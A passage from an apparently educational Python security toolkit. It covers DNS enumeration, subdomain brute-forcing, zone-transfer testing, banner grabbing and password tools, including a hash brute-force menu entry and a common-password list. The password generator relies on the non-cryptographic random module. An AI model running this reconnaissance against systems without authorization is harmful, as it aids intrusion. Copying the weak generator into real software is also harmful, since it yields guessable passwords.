        results.append(("Character Set", "FAIL", "Invalid characters detected"))
    
    # Common hash length validation
    common_lengths = [16, 32, 40, 56, 64, 96, 128]
    if length in common_lengths:
        results.append(("Length Validation", "PASS", f"Common hash length: {length}"))
    else:
        results.append(("Length Validation", "WARN", f"Unusual length: {length}"))
    
    # Pattern validation
    if re.match(r'^[a-fA-F0-9]{32}$', hash_input):
        results.append(("Pattern Match", "PASS", "Matches MD5/SHA pattern"))
    elif re.match(r'^[a-fA-F0-9]{40}$', hash_input):
        results.append(("Pattern Match", "PASS", "Matches SHA1 pattern"))
    elif re.match(r'^[a-fA-F0-9]{64}$', hash_input):
        results.append(("Pattern Match", "PASS", "Matches SHA256 pattern"))
    elif re.match(r'^[a-fA-F0-9]{128}$', hash_input):
        results.append(("Pattern Match", "PASS", "Matches SHA512 pattern"))
    elif hash_input.startswith('$2'):
        results.append(("Pattern Match", "PASS", "Matches bcrypt pattern"))
    elif hash_input.startswith('$1$') or hash_input.startswith('$5$') or hash_input.startswith('$6$'):
        results.append(("Pattern Match", "PASS", "Matches crypt pattern"))
    else:
        results.append(("Pattern Match", "WARN", "No common pattern match"))
    
    return results


def dns_tools():
    """Enhanced DNS lookup and enumeration tools with subdomain discovery."""
    print("\n[Enhanced DNS Tools]")
    print("⚠️  WARNING: Only test domains you own or have explicit permission to test.")
    
    while True:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold cyan]DNS Tools:[/bold cyan]")
            cli_manager.console.print("1. [green]DNS Lookup[/green] - Standard DNS queries")
            cli_manager.console.print("2. [yellow]Reverse DNS Lookup[/yellow] - IP to hostname")
            cli_manager.console.print("3. [blue]DNS Enumeration[/blue] - Multiple record types")
            cli_manager.console.print("4. [magenta]Subdomain Enumeration[/magenta] - Subdomain discovery")
            cli_manager.console.print("5. [red]Zone Transfer Test[/red] - DNS zone transfer (lab-safe)")
            cli_manager.console.print("6. [cyan]DNS Security Check[/cyan] - Security misconfigurations")
            cli_manager.console.print("0. [white]Back to main menu[/white]")
        else:
            print("\nDNS Tools:")
            print("1. DNS Lookup")
            print("2. Reverse DNS Lookup")
            print("3. DNS Enumeration")
            print("4. Subdomain Enumeration")
            print("5. Zone Transfer Test")
            print("6. DNS Security Check")
            print("0. Back to main menu")
        
        choice = safe_input("Select option: ")
        if not choice:
            return
        
        if choice == "0":
            return
        
        elif choice == "1":
            dns_lookup()
        
        elif choice == "2":
            reverse_dns_lookup()
        
        elif choice == "3":
            dns_enumeration()
        
        elif choice == "4":
            subdomain_enumeration()
        
        elif choice == "5":
            zone_transfer_test()
        
        elif choice == "6":
            dns_security_check()
        
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Invalid option.[/red]")
            else:
                print("Invalid option.")

def dns_lookup():
    """Enhanced DNS lookup with multiple record types."""
    domain = safe_input("Enter domain: ")
    if not domain:
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]DNS Lookup for {domain}[/bold green]")
    else:
        print(f"\nDNS Lookup for {domain}")
    
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    
    for record_type in record_types:
        try:
            answers = dns.resolver.resolve(domain, record_type)
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[cyan]{record_type} Records:[/cyan]")
            else:
                print(f"\n{record_type} Records:")
            
            for answer in answers:
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"  [green]{answer}[/green]")
                else:
                    print(f"  {answer}")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[dim]{record_type}: No records found[/dim]")
            else:
                print(f"{record_type}: No records found")

def reverse_dns_lookup():
    """Enhanced reverse DNS lookup."""
    ip = safe_input("Enter IP address: ")
    if not ip or not validate_ip(ip):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid IP address.[/red]")
        else:
            print("Invalid IP address.")
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Reverse DNS Lookup for {ip}[/bold green]")
    else:
        print(f"\nReverse DNS Lookup for {ip}")
    
    try:
        reverse_name = dns.reversename.from_address(ip)
        answers = dns.resolver.resolve(reverse_name, 'PTR')
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[cyan]PTR Records:[/cyan]")
        else:
            print(f"\nPTR Records:")
        
        for answer in answers:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"  [green]{answer}[/green]")
            else:
                print(f"  {answer}")
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]Error: {e}[/red]")
        else:
            print(f"Error: {e}")

def dns_enumeration():
    """Comprehensive DNS enumeration."""
    domain = safe_input("Enter domain: ")
    if not domain:
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]DNS Enumeration for {domain}[/bold green]")
    else:
        print(f"\nDNS Enumeration for {domain}")
    
    # Extended record types
    record_types = {
        'A': 'IPv4 Address',
        'AAAA': 'IPv6 Address',
        'MX': 'Mail Exchange',
        'NS': 'Name Server',
        'TXT': 'Text Records',
        'CNAME': 'Canonical Name',
        'SOA': 'Start of Authority',
        'PTR': 'Pointer',
        'SRV': 'Service',
        'CAA': 'Certification Authority Authorization'
    }
    
    results = {}
    
    for record_type, description in record_types.items():
        try:
            answers = dns.resolver.resolve(domain, record_type)
            results[record_type] = list(answers)
        except Exception as e:
            results[record_type] = []
    
    # Display results
    if cli_manager.enable_rich and RICH_AVAILABLE:
        table = Table(title="DNS Enumeration Results", show_header=True, header_style="bold magenta")
        table.add_column("Record Type", style="cyan", no_wrap=True)
        table.add_column("Description", style="yellow")
        table.add_column("Records", style="green")
        
        for record_type, description in record_types.items():
            records = results[record_type]
            if records:
                records_str = "\n".join([str(r) for r in records])
                table.add_row(record_type, description, records_str)
            else:
                table.add_row(record_type, description, "No records")
        
        cli_manager.console.print(table)
    else:
        for record_type, description in record_types.items():
            records = results[record_type]
            print(f"\n{record_type} ({description}):")
            if records:
                for record in records:
                    print(f"  {record}")
            else:
                print("  No records found")

def subdomain_enumeration():
    """Subdomain enumeration using multiple techniques."""
    domain = safe_input("Enter domain: ")
    if not domain:
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Subdomain Enumeration for {domain}[/bold green]")
    else:
        print(f"\nSubdomain Enumeration for {domain}")
    
    # Common subdomain wordlist
    common_subdomains = [
        'www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test', 'staging', 'api',
        'cdn', 'ns1', 'ns2', 'smtp', 'pop', 'imap', 'webmail', 'support',
        'help', 'docs', 'wiki', 'forum', 'shop', 'store', 'app', 'mobile',
        'secure', 'vpn', 'remote', 'backup', 'db', 'database', 'sql', 'mysql',
        'oracle', 'redis', 'cache', 'proxy', 'gateway', 'router', 'firewall',
        'monitor', 'stats', 'analytics', 'tracking', 'ads', 'advertising',
        'media', 'files', 'download', 'upload', 'static', 'assets', 'img',
        'images', 'css', 'js', 'fonts', 'video', 'audio', 'stream', 'live'
    ]
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"[dim]Testing {len(common_subdomains)} common subdomains...[/dim]")
    else:
        print(f"Testing {len(common_subdomains)} common subdomains...")
    
    progress = ProgressBar(len(common_subdomains), "Subdomain Discovery")
    found_subdomains = []
    
    def check_subdomain(subdomain):
        """Check if a subdomain exists."""
        try:
            full_domain = f"{subdomain}.{domain}"
            answers = dns.resolver.resolve(full_domain, 'A')
            return {"subdomain": full_domain, "ips": [str(ip) for ip in answers]}
        except:
            return None
    
    # Multi-threaded subdomain checking
    with ThreadPoolExecutor(max_workers=config.getint('DEFAULT', 'max_threads', 50)) as executor:
        future_to_subdomain = {executor.submit(check_subdomain, subdomain): subdomain for subdomain in common_subdomains}
        
        for future in as_completed(future_to_subdomain):
            try:
                result = future.result()
                if result:
                    found_subdomains.append(result)
                    if cli_manager.enable_rich and RICH_AVAILABLE:
                        cli_manager.console.print(f"\n[green][+] {result['subdomain']}[/green] - {', '.join(result['ips'])}")
                    else:
                        print(f"\n[+] {result['subdomain']} - {', '.join(result['ips'])}")
                progress.update()
            except Exception as e:
                progress.update()
    
    progress.finish()
    
    # Display results
    if found_subdomains:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold green]✓ Found {len(found_subdomains)} subdomains![/bold green]")
            
            table = Table(title="Subdomain Discovery Results", show_header=True, header_style="bold magenta")
            table.add_column("Subdomain", style="cyan", no_wrap=True)
            table.add_column("IP Addresses", style="green")
            
            for subdomain_info in sorted(found_subdomains, key=lambda x: x["subdomain"]):
                table.add_row(subdomain_info["subdomain"], ", ".join(subdomain_info["ips"]))
            
            cli_manager.console.print(table)
        else:
            print(f"\n✓ Found {len(found_subdomains)} subdomains!")
            for subdomain_info in sorted(found_subdomains, key=lambda x: x["subdomain"]):
                print(f"  {subdomain_info['subdomain']} - {', '.join(subdomain_info['ips'])}")
        
        # Save report
        report_content = f"""
Subdomain Enumeration Report
===========================
Domain: {domain}
Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Duration: {progress.elapsed_time:.2f} seconds

Found Subdomains:
{chr(10).join([f'- {s["subdomain"]} ({", ".join(s["ips"])})' for s in sorted(found_subdomains, key=lambda x: x["subdomain"])])}

Total Subdomains Found: {len(found_subdomains)}
        """
        save_report(report_content.strip(), f"subdomain_enumeration_{domain}")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold yellow]No subdomains found for {domain}[/bold yellow]")
        else:
            print(f"\nNo subdomains found for {domain}")

def zone_transfer_test():
    """Test DNS zone transfer (lab-safe)."""
    domain = safe_input("Enter domain: ")
    if not domain:
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Zone Transfer Test for {domain}[/bold green]")
        cli_manager.console.print("[yellow]⚠️  This is a lab-safe test for educational purposes only.[/yellow]")
    else:
        print(f"\nZone Transfer Test for {domain}")
        print("⚠️  This is a lab-safe test for educational purposes only.")
    
    # Get nameservers
    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        nameservers = [str(ns) for ns in ns_records]
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]Error getting nameservers: {e}[/red]")
        else:
            print(f"Error getting nameservers: {e}")
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[cyan]Nameservers:[/cyan] {', '.join(nameservers)}")
    else:
        print(f"\nNameservers: {', '.join(nameservers)}")
    
    zone_transfer_results = []
    
    for nameserver in nameservers:
        try:
            # Create zone transfer query
            zone = dns.zone.from_xfr(dns.query.xfr(nameserver, domain))
            
            if zone:
                records = []
                for name, node in zone.nodes.items():
                    for rdataset in node.rdatasets:
                        for rdata in rdataset:
                            records.append(f"{name} {rdataset.rdtype} {rdata}")
                
                zone_transfer_results.append({
                    "nameserver": nameserver,
                    "success": True,
                    "records": records
                })
                
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"\n[red]⚠️  Zone transfer SUCCESSFUL on {nameserver}[/red]")
                    cli_manager.console.print(f"[dim]Found {len(records)} records[/dim]")
                else:
                    print(f"\n⚠️  Zone transfer SUCCESSFUL on {nameserver}")
                    print(f"Found {len(records)} records")
            else:
                zone_transfer_results.append({
                    "nameserver": nameserver,
                    "success": False,
                    "records": []
                })
                
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print(f"\n[green]✓ Zone transfer blocked on {nameserver}[/green]")
                else:
                    print(f"\n✓ Zone transfer blocked on {nameserver}")
                    
        except Exception as e:
            zone_transfer_results.append({
                "nameserver": nameserver,
                "success": False,
                "records": []
            })
            
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✓ Zone transfer blocked on {nameserver}[/green]")
            else:
                print(f"\n✓ Zone transfer blocked on {nameserver}")
    
    # Security assessment
    vulnerable_ns = [r for r in zone_transfer_results if r["success"]]
    
    if vulnerable_ns:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold red]SECURITY ISSUE: Zone transfer allowed on {len(vulnerable_ns)} nameserver(s)![/bold red]")
        else:
            print(f"\nSECURITY ISSUE: Zone transfer allowed on {len(vulnerable_ns)} nameserver(s)!")
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[bold green]✓ Zone transfer properly secured on all nameservers[/bold green]")
        else:
            print(f"\n✓ Zone transfer properly secured on all nameservers")

def dns_security_check():
    """Check for common DNS security misconfigurations."""
    domain = safe_input("Enter domain: ")
    if not domain:
        return
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]DNS Security Check for {domain}[/bold green]")
    else:
        print(f"\nDNS Security Check for {domain}")
    
    security_issues = []
    security_passed = []
    
    # Check 1: Open recursion
    try:
        # This is a simplified check - in practice, you'd need to test from external networks
        security_passed.append("Recursion control (requires external testing)")
    except:
        security_issues.append("Open recursion detected")
    
    # Check 2: DNSSEC
    try:
        dns.resolver.resolve(domain, 'DNSKEY')
        security_passed.append("DNSSEC enabled")
    except:
        security_issues.append("DNSSEC not configured")
    
    # Check 3: Multiple nameservers
    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        if len(ns_records) >= 2:
            security_passed.append(f"Multiple nameservers ({len(ns_records)})")
        else:
            security_issues.append("Single nameserver (redundancy issue)")
    except:
        security_issues.append("Cannot resolve nameservers")
    
    # Check 4: CAA records
    try:
        dns.resolver.resolve(domain, 'CAA')
        security_passed.append("CAA records configured")
    except:
        security_issues.append("CAA records not configured")
    
    # Display results
    if cli_manager.enable_rich and RICH_AVAILABLE:
        if security_issues:
            cli_manager.console.print(f"\n[bold red]Security Issues Found ({len(security_issues)}):[/bold red]")
            for issue in security_issues:
                cli_manager.console.print(f"  [red]✗ {issue}[/red]")
        
        if security_passed:
            cli_manager.console.print(f"\n[bold green]Security Measures Passed ({len(security_passed)}):[/bold green]")
            for passed in security_passed:
                cli_manager.console.print(f"  [green]✓ {passed}[/green]")
    else:
        if security_issues:
            print(f"\nSecurity Issues Found ({len(security_issues)}):")
            for issue in security_issues:
                print(f"  ✗ {issue}")
        
        if security_passed:
            print(f"\nSecurity Measures Passed ({len(security_passed)}):")
            for passed in security_passed:
                print(f"  ✓ {passed}")


def banner_grabber():
    """Grab service banners from network hosts."""
    print("\n[Banner Grabber]")
    
    host = safe_input("Enter target host/IP: ")
    if not host:
        return
    
    if not (validate_ip(host) or validate_hostname(host)):
        print("Invalid host/IP address.")
        return
    
    port_input = safe_input("Enter port (default 80): ")
    if not port_input:
        port = 80
    else:
        if not validate_port(port_input):
            print("Invalid port number.")
            return
        port = int(port_input)
    
    timeout_input = safe_input("Enter timeout in seconds (default 5): ")
    if not timeout_input:
        timeout = 5
    else:
        try:
            timeout = int(timeout_input)
        except ValueError:
            print("Invalid timeout value.")
            return
    
    print(f"\nGrabbing banner from {host}:{port}...")
    
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        # Connect to target
        result = sock.connect_ex((host, port))
        if result == 0:
            print("✓ Connection successful")
            
            # Send a basic request
            if port == 80:
                request = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
            elif port == 443:
                request = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
            else:
                request = b"\r\n"
            
            sock.send(request)
            
            # Receive response
            response = sock.recv(1024)
            if response:
                print("\n[Response]")
                try:
                    print(response.decode('utf-8', errors='ignore'))
                except:
                    print(response.hex())
            else:
                print("No response received")
        else:
            print("✗ Connection failed")
            
    except socket.timeout:
        print("✗ Connection timeout")
    except socket.gaierror:
        print("✗ Hostname resolution failed")
    except Exception as e:
        print(f"✗ Error: {e}")
    finally:
        try:
            sock.close()
        except:
            pass


def password_tools():
    """Enhanced password analysis, generation, and wordlist mutation tools."""
    print("\n[Enhanced Password Tools]")
    
    while True:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[bold cyan]Password Tools Menu:[/bold cyan]")
            cli_manager.console.print("1. [green]Password Strength Analyzer[/green] - Advanced strength analysis with entropy")
            cli_manager.console.print("2. [yellow]Advanced Password Generator[/yellow] - Multiple generation modes")
            cli_manager.console.print("3. [blue]Common Password Checker[/blue] - Check against common passwords")
            cli_manager.console.print("4. [red]Wordlist Mutator[/red] - Generate password variations")
            cli_manager.console.print("5. [magenta]Entropy Calculator[/magenta] - Calculate password entropy")
            cli_manager.console.print("6. [cyan]Brute-Force Attack[/cyan] - Hash cracking")
            cli_manager.console.print("0. [white]Back to main menu[/white]")
        else:
            print("\nPassword Tools Menu:")
            print("1. Password Strength Analyzer - Advanced strength analysis with entropy")
            print("2. Advanced Password Generator - Multiple generation modes")
            print("3. Common Password Checker - Check against common passwords")
            print("4. Wordlist Mutator - Generate password variations")
            print("5. Entropy Calculator - Calculate password entropy")
            print("6. Brute-Force Attack - Hash cracking")
            print("0. Back to main menu")
        
        choice = safe_input("Select operation: ")
        if not choice:
            return
        
        if choice == "0":
            return
        
        elif choice == "1":  # Enhanced Password Strength Analyzer
            password_strength_analyzer()
        
        elif choice == "2":  # Advanced Password Generator
            advanced_password_generator()
        
        elif choice == "3":  # Common Password Checker
            common_password_checker()
        
        elif choice == "4":  # Wordlist Mutator
            wordlist_mutator()
        
        elif choice == "5":  # Entropy Calculator
            entropy_calculator()
        
        elif choice == "6":  # Brute-Force Attack
            brute_force_attack()
        
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Invalid option. Please try again.[/red]")
            else:
                print("Invalid option. Please try again.")


def calculate_entropy(password):
    """Calculate password entropy (bits of randomness)."""
    import math
    
    # Character sets
    lowercase = set('abcdefghijklmnopqrstuvwxyz')
    uppercase = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    digits = set('0123456789')
    special = set('!@#$%^&*()_+-=[]{}|;:,.<>?')
    
    # Determine character pool size
    pool_size = 0
    if any(c in lowercase for c in password):
        pool_size += 26
    if any(c in uppercase for c in password):
        pool_size += 26
    if any(c in digits for c in password):
        pool_size += 10
    if any(c in special for c in password):
        pool_size += 32  # Common special characters
    
    # Calculate entropy
    if pool_size > 0:
        entropy = len(password) * math.log2(pool_size)
        return entropy
    else:
        return 0


def password_strength_analyzer():
    """Enhanced password strength analyzer with entropy calculation."""
    print("\n[Enhanced Password Strength Analyzer]")
    
    password = safe_input("Enter password to analyze: ")
    if not password:
        return
    
    # Calculate entropy
    entropy = calculate_entropy(password)
    
    # Enhanced strength analysis
    score = 0
    feedback = []
    details = {}
    
    # Length analysis
    length = len(password)
    details['length'] = length
    if length >= 12:
        score += 2
    elif length >= 8:
        score += 1
    else:
        feedback.append("Too short (minimum 8 characters, recommended 12+)")
    
    # Character set analysis
    lowercase_count = sum(1 for c in password if c.islower())
    uppercase_count = sum(1 for c in password if c.isupper())
    digit_count = sum(1 for c in password if c.isdigit())
    special_count = sum(1 for c in password if c in "!@#$%^&*()_+-=[]{}|;:,.<>?")
    
    details['lowercase'] = lowercase_count
    details['uppercase'] = uppercase_count
    details['digits'] = digit_count
    details['special'] = special_count
    
    if lowercase_count > 0:
        score += 1
    else:
        feedback.append("No lowercase letters")
    
    if uppercase_count > 0:
        score += 1
    else:
        feedback.append("No uppercase letters")
    
    if digit_count > 0:
        score += 1
    else:
        feedback.append("No numbers")
    
    if special_count > 0:
        score += 1
    else:
        feedback.append("No special characters")
    
    # Pattern analysis
    patterns = []
    if password.isdigit():
        patterns.append("All digits")
        score -= 1
    if password.isalpha():
        patterns.append("All letters")
        score -= 1
    if password.islower():
        patterns.append("All lowercase")
        score -= 1
    if password.isupper():
        patterns.append("All uppercase")
        score -= 1
    
    # Sequential patterns
    sequential_patterns = ['123', 'abc', 'qwe', 'asd', 'zxc']
    for pattern in sequential_patterns:
        if pattern in password.lower():
            patterns.append(f"Sequential pattern: {pattern}")
            score -= 1
            break
    
    # Repeated characters
    for i in range(len(password) - 2):
        if password[i] == password[i+1] == password[i+2]:
            patterns.append("Repeated characters")
            score -= 1
            break
    
    # Strength rating
    strength_map = {
        0: "Very Weak",
        1: "Weak", 
        2: "Fair",
        3: "Good",
        4: "Strong",
        5: "Very Strong",
        6: "Excellent"
    }
    
    # Entropy-based strength
    entropy_strength = "Very Weak"
    if entropy >= 128:
        entropy_strength = "Excellent"
    elif entropy >= 64:
        entropy_strength = "Very Strong"
    elif entropy >= 32:
        entropy_strength = "Strong"
    elif entropy >= 16:
        entropy_strength = "Good"
    elif entropy >= 8:
        entropy_strength = "Fair"
    elif entropy >= 4:
        entropy_strength = "Weak"
    
    # Display results
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Password Strength Analysis:[/bold green]")
        
        # Summary table
        table = Table(title="Password Analysis", show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan", no_wrap=True)
        table.add_column("Value", style="green")
        table.add_column("Score", style="yellow", justify="right")
        
        table.add_row("Length", str(length), f"{min(2, max(0, (length-8)//4))}/2")
        table.add_row("Lowercase", str(lowercase_count), f"{min(1, lowercase_count)}/1")
        table.add_row("Uppercase", str(uppercase_count), f"{min(1, uppercase_count)}/1")
        table.add_row("Digits", str(digit_count), f"{min(1, digit_count)}/1")
        table.add_row("Special", str(special_count), f"{min(1, special_count)}/1")
        table.add_row("Entropy", f"{entropy:.1f} bits", "")
        table.add_row("Overall Score", f"{score}/6", strength_map.get(score, "Unknown"))
        
        cli_manager.console.print(table)
        
        # Entropy analysis
        cli_manager.console.print(f"\n[bold yellow]Entropy Analysis:[/bold yellow]")
        cli_manager.console.print(f"Entropy: [green]{entropy:.1f} bits[/green]")
        cli_manager.console.print(f"Entropy Strength: [green]{entropy_strength}[/green]")
        
        if entropy < 32:
            cli_manager.console.print(f"[red]⚠️  Low entropy - password may be easily guessable[/red]")
        elif entropy < 64:
            cli_manager.console.print(f"[yellow]⚠️  Moderate entropy - consider strengthening[/yellow]")
        else:
            cli_manager.console.print(f"[green]✓ Good entropy - password is reasonably strong[/green]")
        
        # Pattern analysis
        if patterns:
            cli_manager.console.print(f"\n[bold red]Pattern Issues:[/bold red]")
            for pattern in patterns:
                cli_manager.console.print(f"  [red]• {pattern}[/red]")
        
        # Recommendations
        if feedback:
            cli_manager.console.print(f"\n[bold yellow]Recommendations:[/bold yellow]")
            for item in feedback:
                cli_manager.console.print(f"  [yellow]• {item}[/yellow]")
        else:
            cli_manager.console.print(f"\n[bold green]✓ Excellent password strength![/bold green]")
        
    else:
        print(f"\nPassword Strength Analysis:")
        print(f"Score: {score}/6 - {strength_map.get(score, 'Unknown')}")
        print(f"Length: {length} characters")
        print(f"Character breakdown: {lowercase_count} lowercase, {uppercase_count} uppercase, {digit_count} digits, {special_count} special")
        print(f"Entropy: {entropy:.1f} bits ({entropy_strength})")
        
        if patterns:
            print(f"\nPattern Issues:")
            for pattern in patterns:
                print(f"  • {pattern}")
        
        if feedback:
            print(f"\nRecommendations:")
            for item in feedback:
                print(f"  • {item}")
        else:
            print(f"\n✓ Excellent password strength!")


def advanced_password_generator():
    """Advanced password generator with multiple modes."""
    print("\n[Advanced Password Generator]")
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold cyan]Generation Modes:[/bold cyan]")
        cli_manager.console.print("1. [green]Random Strong[/green] - Random characters with all types")
        cli_manager.console.print("2. [yellow]Memorable[/yellow] - Word-based with substitutions")
        cli_manager.console.print("3. [blue]Pattern-Based[/blue] - Customizable pattern")
        cli_manager.console.print("4. [red]High Entropy[/red] - Maximum randomness")
    else:
        print("\nGeneration Modes:")
        print("1. Random Strong - Random characters with all types")
        print("2. Memorable - Word-based with substitutions")
        print("3. Pattern-Based - Customizable pattern")
        print("4. High Entropy - Maximum randomness")
    
    mode = safe_input("Select generation mode (1-4): ")
    if not mode:
        return
    
    length_input = safe_input("Enter password length (8-64, default 16): ")
    if not length_input:
        length = 16
    else:
        try:
            length = int(length_input)
            if not (8 <= length <= 64):
                if cli_manager.enable_rich and RICH_AVAILABLE:
                    cli_manager.console.print("[red]Length must be between 8 and 64.[/red]")
                else:
                    print("Length must be between 8 and 64.")
                return
        except ValueError:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Invalid length.[/red]")
            else:
                print("Invalid length.")
            return
    
    passwords = []
    
    if mode == "1":  # Random Strong
        # Character sets
        lowercase = string.ascii_lowercase
        uppercase = string.ascii_uppercase
        digits = string.digits
        special = "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
        for _ in range(5):
            # Ensure at least one character from each set
            password = [
                random.choice(lowercase),
                random.choice(uppercase),
                random.choice(digits),
                random.choice(special)
            ]
            
            # Fill remaining length
            all_chars = lowercase + uppercase + digits + special
            password.extend(random.choice(all_chars) for _ in range(length - 4))
            
            # Shuffle the password
            random.shuffle(password)
            passwords.append(''.join(password))
    
    elif mode == "2":  # Memorable
        # Common words for memorable passwords
        words = [
            'correct', 'horse', 'battery', 'staple', 'purple', 'monkey',
            'dolphin', 'sunshine', 'mountain', 'ocean', 'forest', 'river',
            'dragon', 'phoenix', 'eagle', 'tiger', 'lion', 'wolf', 'bear',
            'elephant', 'giraffe', 'penguin', 'octopus', 'butterfly'
        ]
        
        for _ in range(5):
            # Select random words
            selected_words = random.sample(words, min(3, length // 4))
            
            # Create password with substitutions
            password = ''.join(selected_words)
            
            # Apply leetspeak substitutions
            substitutions = {
                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
            }
            
            for old, new in substitutions.items():
                if random.random() < 0.3:  # 30% chance of substitution
                    password = password.replace(old, new)
            
            # Add numbers and special characters
            password += str(random.randint(10, 99))
            password += random.choice("!@#$%^&*")
            
            # Ensure minimum length
            while len(password) < length:
                password += random.choice(string.ascii_letters + string.digits)
            
            # Truncate if too long
            password = password[:length]
            passwords.append(password)
    
    elif mode == "3":  # Pattern-Based
        pattern = safe_input("Enter pattern (L=lowercase, U=uppercase, D=digit, S=special, *=any): ")
        if not pattern:
            pattern = "LUDSUDSUDSUDSUDS"  # Default pattern
        
        for _ in range(5):
            password = ""
            for char in pattern:
                if char.upper() == 'L':
                    password += random.choice(string.ascii_lowercase)
                elif char.upper() == 'U':
                    password += random.choice(string.ascii_uppercase)
                elif char.upper() == 'D':
                    password += random.choice(string.digits)
                elif char.upper() == 'S':
                    password += random.choice("!@#$%^&*()_+-=[]{}|;:,.<>?")
                elif char == '*':
                    password += random.choice(string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?")
                else:
                    password += char
            
            # Ensure minimum length
            while len(password) < length:
                password += random.choice(string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?")
            
            # Truncate if too long
            password = password[:length]
            passwords.append(password)
    
    elif mode == "4":  # High Entropy
        # Use all available characters for maximum entropy
        all_chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?`~"
        
        for _ in range(5):
            password = ''.join(random.choice(all_chars) for _ in range(length))
            passwords.append(password)
    
    # Display generated passwords
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Generated Passwords:[/bold green]")
        
        table = Table(title="Generated Passwords", show_header=True, header_style="bold magenta")
        table.add_column("#", style="cyan", justify="right")
        table.add_column("Password", style="green", no_wrap=True)
        table.add_column("Entropy", style="yellow", justify="right")
        
        for i, password in enumerate(passwords, 1):
            entropy = calculate_entropy(password)
            table.add_row(str(i), password, f"{entropy:.1f} bits")
        
        cli_manager.console.print(table)
        
    else:
        print(f"\nGenerated Passwords:")
        for i, password in enumerate(passwords, 1):
            entropy = calculate_entropy(password)
            print(f"{i}. {password} (Entropy: {entropy:.1f} bits)")


def common_password_checker():
    """Enhanced common password checker."""
    print("\n[Common Password Checker]")
    
    password = safe_input("Enter password to check: ")
    if not password:
        return
    
    # Enhanced common password list (top 1000+)
    common_passwords = [
        "password", "123456", "123456789", "12345678", "12345", "qwerty",
        "abc123", "football", "1234567", "monkey", "111111", "letmein",
        "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou",
        "trustno1", "princess", "admin", "welcome", "solo", "master",
        "hello", "freedom", "whatever", "qazwsx", "michael", "jordan",
        "superman", "harley", "mustang", "shadow", "master", "jennifer",
        "joshua", "mypass", "super", "hello", "freedom", "whatever",
        "qazwsx", "michael", "jordan", "superman", "harley", "mustang",
        "shadow", "master", "jennifer", "joshua", "password123", "admin123",
        "root", "toor", "123123", "123321", "qwerty123", "password1",
        "123456789", "1234567890", "qwertyuiop", "asdfghjkl", "zxcvbnm",
        "qwerty123", "password123", "admin123", "root123", "123456789",
        "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwerty123", "password123"
    ]
    
    # Check variations
    variations = [
        password.lower(),
        password.upper(),
        password,
        password.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '$'),
        password + '123',
        password + '1',
        password + '2023',
        password + '2024'
    ]
    
    found_variations = []
    for var in variations:
        if var in common_passwords:
            found_variations.append(var)
    
    if found_variations:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[red]⚠️  WARNING: Password variations found in common password list![/red]")
